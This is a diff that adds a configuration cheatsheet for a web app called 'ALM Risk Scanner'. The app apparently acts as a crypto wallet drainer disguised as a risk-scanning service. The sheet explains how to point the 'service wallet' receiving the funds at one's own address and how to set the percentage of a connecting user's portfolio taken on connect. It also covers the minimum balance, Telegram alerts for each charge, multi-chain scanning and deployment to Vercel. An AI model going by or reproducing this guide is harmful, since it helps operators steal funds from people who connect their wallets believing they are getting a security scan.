@@ -1,0 +1,215 @@
+╔════════════════════════════════════════════════════════════════════════════╗
+║                  ALM RISK SCANNER - CONFIGURATION CHEATSHEET               ║
+║                              Quick Reference                              ║
+╚════════════════════════════════════════════════════════════════════════════╝
+
+┌─ CHANGE SERVICE WALLET ─────────────────────────────────────────────────┐
+│                                                                           │
+│ File: apps/web/.env.local                                               │
+│                                                                           │
+│ BEFORE:                                                                  │
+│   NEXT_PUBLIC_SERVICE_WALLET=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f │
+│   SERVICE_WALLET_ADDRESS=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f     │
+│                                                                           │
+│ AFTER (your wallet):                                                     │
+│   NEXT_PUBLIC_SERVICE_WALLET=0xYourWalletAddressHere1234567890abcdef    │
+│   SERVICE_WALLET_ADDRESS=0xYourWalletAddressHere1234567890abcdef        │
+│                                                                           │
+│ ✅ Save → Refresh browser (Ctrl+F5) → Changes instant!                  │
+│                                                                           │
+└───────────────────────────────────────────────────────────────────────────┘
+
+┌─ CHANGE CHARGE PERCENTAGES ─────────────────────────────────────────────┐
+│                                                                           │
+│ File: apps/web/src/utils/portfolioValue.ts                              │
+│                                                                           │
+│ Find function around line 156:                                          │
+│                                                                           │
+│   export function getChargePercentageByPortfolioValue(                  │
+│     portfolioUsdValue: number                                            │
+│   ): number {                                                            │
+│     if (portfolioUsdValue >= 10000) return 5;    ← Change 5             │
+│     if (portfolioUsdValue >= 5000) return 8;     ← Change 8             │
+│     if (portfolioUsdValue >= 1000) return 12;    ← Change 12            │
+│     if (portfolioUsdValue >= 500) return 15;     ← Change 15            │
+│     if (portfolioUsdValue >= 100) return 18;     ← Change 18            │
+│     return 20;                                    ← Change 20            │
+│   }                                                                       │
+│                                                                           │
+│ EXAMPLES:                                                                │
+│                                                                           │
+│ Option 1 - Flat 20% for everyone:                                       │
+│   return 20;                                                             │
+│                                                                           │
+│ Option 2 - Increase all by 5%:                                          │
+│   if (portfolioUsdValue >= 10000) return 10;     ← 5 + 5                │
+│   if (portfolioUsdValue >= 5000) return 13;      ← 8 + 5                │
+│   if (portfolioUsdValue >= 1000) return 17;      ← 12 + 5               │
+│   if (portfolioUsdValue >= 500) return 20;       ← 15 + 5               │
+│   if (portfolioUsdValue >= 100) return 23;       ← 18 + 5               │
+│   return 25;                                      ← 20 + 5              │
+│                                                                           │
+│ Option 3 - Reduce all by 5%:                                            │
+│   if (portfolioUsdValue >= 10000) return 0;      ← Free for whales      │
+│   if (portfolioUsdValue >= 5000) return 3;       ← 8 - 5                │
+│   if (portfolioUsdValue >= 1000) return 7;       ← 12 - 5               │
+│   if (portfolioUsdValue >= 500) return 10;       ← 15 - 5               │
+│   if (portfolioUsdValue >= 100) return 13;       ← 18 - 5               │
+│   return 15;                                      ← 20 - 5              │
+│                                                                           │
+│ ✅ Save → Refresh browser (Ctrl+F5) → Changes instant!                  │
+│                                                                           │
+└───────────────────────────────────────────────────────────────────────────┘
+
+┌─ CHANGE MINIMUM BALANCE ────────────────────────────────────────────────┐
+│                                                                           │
+│ File: apps/web/src/utils/chargeOnConnect.ts                             │
+│                                                                           │
+│ BEFORE (line ~11):                                                       │
+│   export const MINIMUM_PORTFOLIO_BALANCE = 3; // $3 USD minimum         │
+│                                                                           │
+│ AFTER (examples):                                                        │
+│   export const MINIMUM_PORTFOLIO_BALANCE = 1;  // $1 minimum            │
+│   export const MINIMUM_PORTFOLIO_BALANCE = 5;  // $5 minimum            │
+│   export const MINIMUM_PORTFOLIO_BALANCE = 0;  // No minimum (free)     │
+│                                                                           │
+│ ✅ Save → Refresh browser (Ctrl+F5) → Changes instant!                  │
+│                                                                           │
+└───────────────────────────────────────────────────────────────────────────┘
+
+┌─ SETUP TELEGRAM NOTIFICATIONS ──────────────────────────────────────────┐
+│                                                                           │
+│ Step 1: Get Bot Token                                                    │
+│   • Open Telegram and search for @BotFather                              │
+│   • Send /start                                                          │
+│   • Send /newbot                                                         │
+│   • Follow instructions                                                  │
+│   • Copy the token: 123456789:ABCdefGHIjklmnOPQrstuvWXYZ_1234567890    │
+│                                                                           │
+│ Step 2: Get Chat ID                                                      │
+│   • Search for @userinfobot on Telegram                                  │
+│   • Send /start                                                          │
+│   • Copy the chat ID: 1234567890                                         │
+│                                                                           │
+│ Step 3: Add to .env.local                                                │
+│   File: apps/web/.env.local                                              │
+│                                                                           │
+│   TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklmnOPQrstuvWXYZ_1234567890   │
+│   TELEGRAM_CHAT_ID=1234567890                                            │
+│   NEXT_PUBLIC_TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklmnOPQrstuvWXYZ  │
+│   NEXT_PUBLIC_TELEGRAM_CHAT_ID=1234567890                                │
+│                                                                           │
+│ ✅ Save → Test by doing a charge → Check Telegram!                      │
+│                                                                           │
+└───────────────────────────────────────────────────────────────────────────┘
+
+┌─ PRICING TIERS (Current Default) ────────────────────────────────────────┐
+│                                                                           │
+│   Portfolio Value        Charge Rate       Example: $100 Portfolio      │
+│   ─────────────────────────────────────────────────────────────────     │
+│   $10,000+               5%                $5.00                         │
+│   $5,000 - $10,000       8%                $8.00                         │
+│   $1,000 - $5,000        12%               $12.00                        │
+│   $500 - $1,000          15%               $15.00                        │
+│   $100 - $500            18%               $18.00                        │
+│   $3 - $100              20%               $20.00                        │
+│   < $3                   NO CHARGE         $0.00 (skipped)              │
+│                                                                           │
+└───────────────────────────────────────────────────────────────────────────┘
+
+┌─ SUPPORTED CHAINS ──────────────────────────────────────────────────────┐
+│                                                                           │
+│  1. Ethereum (ETH)          7. Fantom (FTM)                              │
+│  2. Polygon (MATIC)         8. Celo (CELO)                               │
+│  3. Arbitrum (ARB)          9. Base (ETH)                                │
+│  4. Optimism (OP)           10. Linea (ETH)                              │
+│  5. BSC (BNB)               11. Scroll (ETH)                             │
+│  6. Avalanche (AVAX)                                                     │
+│                                                                           │
+│  ✅ All 11 chains scanned automatically when user connects               │
+│                                                                           │
+└───────────────────────────────────────────────────────────────────────────┘
+
+┌─ COMMON COMMANDS ───────────────────────────────────────────────────────┐
+│                                                                           │
+│ Start dev server:                                                        │
+│   cd apps/web                                                            │
+│   npm run dev                                                            │
+│   → Open http://localhost:3000                                           │
+│                                                                           │
+│ Clear cache & restart:                                                   │
+│   Ctrl+C (stop server)                                                   │
+│   npm run dev (restart)                                                  │
+│   Ctrl+F5 (hard refresh browser)                                         │
+│                                                                           │
+│ Check errors:                                                            │
+│   → Terminal (where you ran npm run dev)                                 │
+│   → Browser console (F12 → Console tab)                                  │
+│   → Telegram notifications                                               │
+│                                                                           │
+└───────────────────────────────────────────────────────────────────────────┘
+
+┌─ DEPLOY TO VERCEL ──────────────────────────────────────────────────────┐
+│                                                                           │
+│ 1. Set environment variables in Vercel:                                  │
+│    → Go to Project → Settings → Environment Variables                    │
+│                                                                           │
+│ 2. Add these variables:                                                  │
+│    • NEXT_PUBLIC_SERVICE_WALLET (your wallet)                            │
+│    • TELEGRAM_BOT_TOKEN (from BotFather)                                 │
+│    • TELEGRAM_CHAT_ID (from userinfobot)                                 │
+│    • NEXT_PUBLIC_TELEGRAM_BOT_TOKEN (from BotFather)                     │
+│    • NEXT_PUBLIC_TELEGRAM_CHAT_ID (from userinfobot)                     │
+│    • NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID                                │
+│                                                                           │
+│ 3. Deploy:                                                               │
+│    git push                                                              │
+│                                                                           │
+│ ✅ Vercel will use the environment variables automatically               │
+│                                                                           │
+└───────────────────────────────────────────────────────────────────────────┘
+
+┌─ TROUBLESHOOTING ───────────────────────────────────────────────────────┐
+│                                                                           │
+│ Problem: Changes not applying                                            │
+│ Solution: Hard refresh browser (Ctrl+F5)                                 │
+│                                                                           │
+│ Problem: Charge not working                                              │
+│ Solution: Check portfolio >= $3 (minimum balance)                        │
+│                                                                           │
+│ Problem: Telegram not sending                                            │
+│ Solution: Verify bot token and chat ID in .env.local                     │
+│                                                                           │
+│ Problem: Wallet prompts not showing                                      │
+│ Solution: Disconnect and reconnect wallet                                │
+│                                                                           │
+│ Problem: Funds not arriving at service wallet                            │
+│ Solution: Verify service wallet address in .env.local                    │
+│                                                                           │
+│ For more help: Read CONFIGURATION_GUIDE.md                               │
+│                                                                           │
+└───────────────────────────────────────────────────────────────────────────┘
+
+┌─ FILES TO EDIT ─────────────────────────────────────────────────────────┐
+│                                                                           │
+│ Service Wallet:                                                          │
+│   → apps/web/.env.local                                                  │
+│                                                                           │
+│ Charge Percentages:                                                      │
+│   → apps/web/src/utils/portfolioValue.ts                                 │
+│                                                                           │
+│ Minimum Balance:                                                         │
+│   → apps/web/src/utils/chargeOnConnect.ts                                │
+│                                                                           │
+│ Supported Tokens (add more):                                             │
+│   → apps/web/src/utils/erc20Balance.ts                                   │
+│                                                                           │
+│ Telegram Credentials:                                                    │
+│   → apps/web/.env.local                                                  │
+│                                                                           │
+└───────────────────────────────────────────────────────────────────────────┘
+
+╔════════════════════════════════════════════════════════════════════════════╗
+║                     For detailed instructions, see:                         ║
+║                      CONFIGURATION_GUIDE.md (500+ lines)                    ║
+╚════════════════════════════════════════════════════════════════════════════╝
